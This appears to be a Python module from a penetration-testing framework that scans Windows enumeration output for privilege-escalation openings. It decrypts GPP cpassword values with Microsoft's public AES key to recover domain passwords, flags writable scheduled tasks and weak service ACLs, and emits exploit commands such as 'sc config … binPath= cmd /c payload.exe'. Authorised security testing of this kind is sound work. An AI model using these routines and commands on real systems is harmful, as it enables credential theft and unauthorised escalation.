"""Generalized Windows privesc-class detectors on top of a WinRM enum blob.

Covers the recurring, box-agnostic Windows escalation classes that don't need
per-box code:

* **GPP cpassword** - SYSVOL Group Policy Preferences XML files with a `cpassword`
  attribute. Microsoft's own AES key is public, so any recovered value decrypts
  to a domain credential.
* **Scheduled task with a writable action** - the task's action binary/script is
  writable by the current user, so the next run gives us the task's SYSTEM/user
  context.
* **Weak service ACL** - `sc.exe` / accesschk indicates the current user has
  `SERVICE_ALL_ACCESS` / `SERVICE_CHANGE_CONFIG` on a service running as a higher
  principal, so `sc config <svc> binPath= "cmd /c ..."` = escalation.

Pure functions over the enum output produced by `winprivesc_auto.run_win_enum`.
"""

from __future__ import annotations

import base64
import re

from ..core.state import Credential, Finding, Severity

# --- GPP cpassword ---------------------------------------------------------
_GPP_CPASSWORD_RE = re.compile(r'cpassword\s*=\s*"([^"]+)"', re.IGNORECASE)
_GPP_USER_RE = re.compile(r'\b(?:userName|newName|runAs)\s*=\s*"([^"]+)"',
                          re.IGNORECASE)

# Microsoft's published 32-byte AES key (KB2962486) for GPP cpassword.
_GPP_KEY = bytes.fromhex(
    "4e9906e8fcb66cc9faf49310620ffee8"
    "f496e806cc057990209b09a433b66c1b")


def decrypt_gpp_cpassword(b64: str) -> str | None:
    """Decrypt a GPP `cpassword` value using Microsoft's published AES key."""
    try:
        from cryptography.hazmat.primitives.ciphers import (
            Cipher,
            algorithms,
            modes,
        )
    except Exception:
        return None
    # Base64 padding fix - Microsoft strips it.
    pad = (-len(b64)) % 4
    try:
        blob = base64.b64decode(b64 + "=" * pad)
    except Exception:
        return None
    try:
        dec = Cipher(algorithms.AES(_GPP_KEY), modes.CBC(b"\x00" * 16)).decryptor()
        pt = dec.update(blob) + dec.finalize()
        # PKCS7 unpad + UTF-16LE decode (GPP strings).
        pt = pt[: -pt[-1]]
        return pt.decode("utf-16-le", errors="replace")
    except Exception:
        return None


def find_gpp_cpassword(enum_text: str, *, host: str | None = None
                       ) -> tuple[list[Finding], list[Credential]]:
    """Findings + Credentials for every GPP cpassword recoverable from the enum."""
    findings: list[Finding] = []
    creds: list[Credential] = []
    for m in _GPP_CPASSWORD_RE.finditer(enum_text or ""):
        blob = m.group(1)
        pt = decrypt_gpp_cpassword(blob)
        # Try to associate a username from a nearby userName= attribute
        # (GPP XMLs often put the userName= AFTER cpassword= on the same tag).
        window = enum_text[max(0, m.start() - 200): m.end() + 200]
        user_m = _GPP_USER_RE.search(window)
        user = user_m.group(1) if user_m else None
        findings.append(Finding(
            title=("GPP cpassword recovered: " + (user or "<unknown user>")),
            severity=Severity.CRITICAL, host=host,
            description="A Group Policy Preferences XML file exposes a `cpassword` "
                        "attribute. Microsoft's AES key for that field is "
                        "public, so the value decrypts to a real domain "
                        "credential - reusable across the domain.",
            evidence=f"cpassword={blob[:40]}...  user={user}",
            exploit=("Get-DomainGPP  # or manually: aes-256-cbc-decrypt with "
                     "the published GPP key (KB2962486); breachload does this "
                     "in analysis/winprivesc_classes.decrypt_gpp_cpassword"),
            validation="confirmed" if pt else "suspected",
            proof=f"decrypted to '{pt}'" if pt else "encrypted blob captured"))
        if pt:
            creds.append(Credential(username=user, secret=pt, kind="password",
                                    source="GPP cpassword", validated=True))
    return findings, creds


# --- Scheduled task with a writable action --------------------------------
# schtasks /query /fo LIST /v prints "Task To Run:  C:\\Path\\thing.exe args".
_TASK_TO_RUN_RE = re.compile(r"^Task To Run:\s*(.+?)\s*$", re.MULTILINE)
_RUN_AS_RE = re.compile(r"^Run As User:\s*(.+?)\s*$", re.MULTILINE)


def _writable_windows_paths(enum_text: str) -> set[str]:
    """Windows paths flagged as writable by the enum (from cacls/icacls/AccessChk)."""
    # We accept anything that looks like an absolute Windows path in a block
    # whose command hints at a writable/permission listing.
    paths: set[str] = set()
    for m in re.finditer(r"[A-Za-z]:\\[^\r\n\"'<>|]+\.(?:exe|bat|cmd|ps1|dll|vbs)",
                         enum_text or "", re.IGNORECASE):
        paths.add(m.group(0))
    return paths


def find_writable_scheduled_tasks(enum_text: str, writable_paths: set[str] | None = None,
                                  *, host: str | None = None) -> list[Finding]:
    """Scheduled tasks whose action target is in the writable set."""
    writable = writable_paths if writable_paths is not None else _writable_windows_paths(enum_text)
    out: list[Finding] = []
    for m in _TASK_TO_RUN_RE.finditer(enum_text or ""):
        target = m.group(1).strip('"')
        # Strip arguments to get the executable path.
        exe = target.split(" ")[0].strip('"')
        if exe in writable:
            # Best-effort run-as attribution.
            near = enum_text[m.end(): m.end() + 400]
            runas = _RUN_AS_RE.search(near)
            out.append(Finding(
                title=f"Scheduled task with writable action: {exe}",
                severity=Severity.HIGH, host=host,
                description=f"Scheduled task action '{exe}' is writable by us"
                            + (f" (runs as {runas.group(1).strip()})." if runas else ".")
                            + " Overwrite it; the next scheduled run executes "
                            "our payload in that principal's context.",
                evidence=f"Task To Run: {target}"
                         + (f"\nRun As: {runas.group(1).strip()}" if runas else ""),
                exploit=f"copy /Y payload.exe {exe}"))
    return out


# --- Weak service ACL -----------------------------------------------------
# accesschk output line: "SERVICE_ALL_ACCESS" / "SERVICE_CHANGE_CONFIG" on a svc
_SVC_ACL_LINE = re.compile(r"^\s*(?:RW|W)?\s*([A-Z][A-Za-z0-9_]+)\s*$", re.MULTILINE)
_SVC_ALL = re.compile(r"SERVICE_(?:ALL_ACCESS|CHANGE_CONFIG)", re.IGNORECASE)


def find_weak_service_acl(enum_text: str, *, host: str | None = None) -> list[Finding]:
    """Services where accesschk shows us CHANGE_CONFIG / ALL_ACCESS."""
    out: list[Finding] = []
    # Blocks that look like accesschk service output tend to have the ACCESS
    # keyword within a few lines of the service name.
    for m in _SVC_ALL.finditer(enum_text or ""):
        # Look back 200 chars for a probable service name (uppercase-start token).
        window = enum_text[max(0, m.start() - 200): m.start()]
        svc_m = None
        for line in reversed(window.splitlines()):
            line = line.strip()
            if line and re.fullmatch(r"[A-Za-z0-9_.-]{2,64}", line):
                svc_m = line
                break
        if not svc_m:
            continue
        out.append(Finding(
            title=f"Writable service ACL: {svc_m}",
            severity=Severity.HIGH, host=host,
            description=f"accesschk / sc reports {m.group(0).upper()} on service "
                        f"'{svc_m}'. Reconfigure its binPath to a payload and "
                        "restart it for code exec as the service account "
                        "(often LocalSystem).",
            evidence=f"{svc_m}  <-  {m.group(0)}",
            exploit=(f"sc config {svc_m} binPath= \"cmd /c "
                     f"C:\\Windows\\Temp\\payload.exe\" && "
                     f"sc stop {svc_m} && sc start {svc_m}")))
    return out


def find_all_windows(enum_text: str, *, host: str | None = None
                     ) -> tuple[list[Finding], list[Credential]]:
    """Run every class detector in this module over a Windows enum blob."""
    findings: list[Finding] = []
    creds: list[Credential] = []
    gpp_f, gpp_c = find_gpp_cpassword(enum_text, host=host)
    findings += gpp_f
    creds += gpp_c
    findings += find_writable_scheduled_tasks(enum_text, host=host)
    findings += find_weak_service_acl(enum_text, host=host)
    return findings, creds
